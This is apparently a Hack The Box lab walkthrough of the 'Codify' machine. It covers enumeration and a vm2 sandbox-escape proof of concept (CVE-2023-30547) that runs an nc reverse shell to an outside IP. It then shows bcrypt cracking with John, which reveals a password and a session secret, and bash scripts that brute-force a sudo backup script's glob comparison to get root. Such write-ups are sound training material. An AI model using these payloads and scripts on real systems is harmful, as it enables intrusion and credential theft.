# HTB: Codify walkthrough

![Codify machine pwned](https://github.com/het-desai/hackthebox/blob/main/codify/screenshots/boxpwned.png "Codify machine pwned")

## Introduction

The exploration of the Codify machine, a comprehensive Nmap scan unraveled the intricacies of its technological landscape, revealing open ports 22, 80, 3000, and 8000. Our attention shifted to the web applications on ports 80 and 3000, particularly focusing on the captivating `codify.htb`. Unveiling a critical Node.js vulnerability (CVE-2023-30547) associated with the vm2 library, we crafted a proof-of-concept (PoC) payload, securing a web shell and initiating user-level access. Delving into a web application at `/var/www/contact`, we deciphered a login mechanism, cracked a user's password, and ascended to root through a sudo-accessible script—culminating in a detailed technical exploration on Codify.

## Machine enumeration

Initiating a scan on the target machine (IP: 10.10.11.239), the Nmap tool revealed interesting details about its open ports and services.

```
# Nmap 7.94SVN scan initiated Wed Feb 21 11:29:15 2024 as: nmap -sCV -o nmap/nmap.init 10.10.11.239
Nmap scan report for 10.10.11.239
Host is up (0.14s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http      Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http      Node.js Express framework
|_http-title: Codify
8000/tcp open  http-alt?
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 21 11:31:13 2024 -- 1 IP address (1 host up) scanned in 117.93 seconds
```

The presence of SSH, Apache, and Node.js Express hints at a diverse technology stack. The web applications on ports 80 and 3000, specifically `codify.htb` are likely to be crucial in the subsequent phases of exploration.

For ease of access to the web applications, I append the domain name "codify.htb" to the /etc/hosts file as mentioned below.

`codify.htb 10.10.11.239`

## svc user access

Upon accessing the web application through port 80, I discovered a button leading to the editor path within the application. This editor allows me to write Node.js code and view the corresponding output. My exploration continued as I navigated to the About page, revealing intriguing information related to the Node.js library "vm2."

![homepage](https://github.com/het-desai/hackthebox/blob/main/codify/screenshots/homepage.png "Home page")

![editorpage](https://github.com/het-desai/hackthebox/blob/main/codify/screenshots/editorpage.png "Editor page")

![aboutpage](https://github.com/het-desai/hackthebox/blob/main/codify/screenshots/aboutpage.png "About page")

Further investigation led me to discover a critical vulnerability, [CVE-2023-30547](https://github.com/advisories/GHSA-ch3r-j5x3-6q2m), associated with the vm2 library. Additionally, I obtained a proof-of-concept (PoC) from [this link](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244).

Before testing my PoC payload, I opted to verify the library version using the following Node.js code:

```js
require('vm2/package.json').version
```

![versionVerify](https://github.com/het-desai/hackthebox/blob/main/codify/screenshots/versioncheck.png "Version verify")

Upon verifying the version, I proceeded to test the payload provided in the PoC. Initiating my netcat listener, I executed the following Node.js payload:

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|/bin/nc.openbsd -4 10.10.16.45 50505 >/tmp/f');
}
`

console.log(vm.run(code));
```

![webshellaccess](https://github.com/het-desai/hackthebox/blob/main/codify/screenshots/webshell.png "Web shell")

The execution of the payload successfully granted me a web shell on the target machine. With the web shell at my disposal, I proceeded to search for the user flag, only to discover that it was owned by a different user.

## joshua user access

Digging deeper into the system, I uncovered an intriguing file located at `/var/www/contact`. Examining the `index.js` file, I identified a login mechanism revealing essential information about the database, encryption algorithm, and software used.

```js
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcryptjs');
const session = require('express-session');
const app = express();
const port = 3001;

// create a new database and table
const db = new sqlite3.Database('tickets.db');
db.run('CREATE TABLE IF NOT EXISTS tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)');
db.run('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT)');

// initialize the session
app.use(session({
    secret: 'G3U9SHG29S872HA028DH278D9178D90A782GH',
    resave: false,
    saveUninitialized: true
}));

...
...
...

// endpoint to handle the login form submission
app.post('/login', (req, res) => {
    // read the data from the request body
    let data = '';
    req.on('data', chunk => {
        data += chunk;
    });
    req.on('end', () => {
        const formData = new URLSearchParams(data);
        const username = formData.get('username');
        const password = formData.get('password');

        db.get('SELECT id, username, password FROM users WHERE username = ?', [username], (err, row) => {
            if (err) {
                console.error(err.message);
                res.sendStatus(500);
                return;
            }

            if (!row) {
                res.sendStatus(401);
                return;
            }

            // check the password hash
            bcrypt.compare(password, row.password, (err, result) => {
                if (err) {
                    console.error(err.message);
                    res.sendStatus(500);
                    return;
                }

                if (!result) {
                    res.sendStatus(401);
                    return;
                }

                // store the user ID in the session
                req.session.userId = row.id;

                res.redirect('/tickets');
            });
        });
    });
});
...
...
...
```

Upon navigating to the /var/www/contact directory, I found a file named tickets.db. Using the sqlite3 command, I inspected the users table, discovering a password hash associated with the username 'joshua'.

```
svc@codify:/var/www/contact$ ls -la
total 120
drwxr-xr-x 3 svc  svc   4096 Sep 12 17:45 .
drwxr-xr-x 5 root root  4096 Sep 12 17:40 ..
-rw-rw-r-- 1 svc  svc   4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc  svc    268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc  svc  77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc  svc   4096 Apr 21  2023 templates
-rw-r--r-- 1 svc  svc  20480 Sep 12 17:45 tickets.db
svc@codify:/var/www/contact$ sqlite3 tickets.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
tickets  users  
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
sqlite>
```

Subsequently, I stored the password hash in joshuaHash.txt and proceeded to crack the password using the JohnTheRipper tool with the rockyou.txt wordlist.

```
john --wordlist=/root/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt joshuaHash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)     
1g 0:00:02:11 DONE (2024-02-21 14:33) 0.007579g/s 10.36p/s 10.36c/s 10.36C/s crazy1..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The tool successfully cracked the password as 'spongebob1'. Using this password, I attempted to log in as the user 'joshua' through the open SSH port, achieving successful access to the system.

## root user access

The first executing the sudo -l command, I discovered that the user "joshua" has permission to run the script /opt/scripts/mysql-backup.sh as root without a password prompt.

```
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

joshua@codify:~$ ls -la /opt/scripts/mysql-backup.sh 
-rwxr-xr-x 1 root root 928 Nov  2 12:26 /opt/scripts/mysql-backup.sh
```

I print the this script and analysis the code.

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

Analyzing the script mysql-backup.sh, I observed that it reads the MySQL password from /root/.creds and compares it with the user input. Interestingly, the script checks for a password confirmation, and upon success, it proceeds to back up MySQL databases.

I attempted to exploit this script by spraying potential passwords from the RockYou wordlist. However, it appeared that the script stopped processing at a specific point twice, prompting further investigation. So, I research about the bash script issue and found an interesting information about [String comparison operators topic from this artical](https://opensource.com/article/19/10/programming-bash-logical-operators-shell-expansions). Bash script is not checking a password it's checking a password.

```bash
#!/bin/bash

while IFS= read -r password; do
    if echo "$password" | sudo /opt/scripts/mysql-backup.sh; then
        echo "Correct password found: $password"
        exit 0
    else
        echo "$password"
    fi
done < rockyou.txt
```

![rockyoufail](https://github.com/het-desai/hackthebox/blob/main/codify/screenshots/rockyoufail.png "Rockyou fail")

I modified my script and it looks like below which reveal the root password.

```bash
#!/bin/bash

password=""

loopStatus=0

while [ $loopStatus -ne 1 ]
do
	for alph in {a..z} {A..Z} {0..9}
	do
		validWord=$password
		tempAstrick=""
		tempAstrick=$validWord
		tempAstrick+=$alph
		tempAstrick+="*"
    	if (echo "$tempAstrick" | sudo /opt/scripts/mysql-backup.sh | grep -q "Password confirmed!")
    	then
        	password=$validWord
        	password+=$alph
    	fi
    	echo "$password $alph"
	done
done
```

![rootaccess](https://github.com/het-desai/hackthebox/blob/main/codify/screenshots/rootaccess.png "Root access")